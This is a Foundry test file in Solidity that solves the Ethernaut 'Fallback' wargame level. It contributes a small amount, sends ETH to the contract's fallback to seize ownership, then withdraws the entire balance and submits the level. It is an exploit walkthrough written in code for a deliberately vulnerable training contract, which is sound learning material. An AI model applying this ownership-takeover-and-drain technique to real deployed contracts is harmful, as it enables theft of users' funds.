// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test, console2} from "forge-std/Test.sol";
import {Ethernaut} from "../src/Ethernaut.sol";
import {FallbackFactory} from "../src/Fallback/FallbackFactory.sol";
import {Fallback} from "../src/Fallback/Fallback.sol";

contract FallbackTest is Test {
    Ethernaut public ethernaut;
    address public PLAYER = makeAddr("player");
    uint256 public PLAYER_STARTING_BALANCE = 1 ether;
    uint256 public AMOUNT_TO_SEND = 100 wei;

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(PLAYER, PLAYER_STARTING_BALANCE);
    }

    function testFallbackHack() public {
        ////////////////////*/
        //    Level Setup
        ////////////////////*/
        FallbackFactory factory = new FallbackFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(PLAYER);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Fallback ethernautFallback = Fallback(payable(levelAddress));

        ////////////////////*/
        //   Level Attack
        ////////////////////*/
        ethernautFallback.contribute{value: AMOUNT_TO_SEND}();
        assertEq(ethernautFallback.getContribution(), AMOUNT_TO_SEND);

        // Send ETH to trigger fallback and become the new onwer
        (bool success,) = payable(address(ethernautFallback)).call{value: AMOUNT_TO_SEND}("");
        assertTrue(success);
        assertEq(ethernautFallback.owner(), PLAYER);

        // Withdraw all ETH
        // emit log_named_uint("Fallback contract balance before withdrawal", address(ethernautFallback).balance);
        console2.log("Fallback contract balance before withdrawal:", address(ethernautFallback).balance);
        ethernautFallback.withdraw();
        uint256 newBalance = address(ethernautFallback).balance;
        // emit log_named_uint("Fallback contract balance after withdrawal", newBalance);
        console2.log("Fallback contract balance after withdrawal:", newBalance);
        assertEq(newBalance, 0);

        //////////////////////*/
        //  Level Submission
        //////////////////////*/
        bool levelCompleted = ethernaut.submitLevelInstance(payable(address(levelAddress)));
        vm.stopPrank();
        assertTrue(levelCompleted);
    }
}
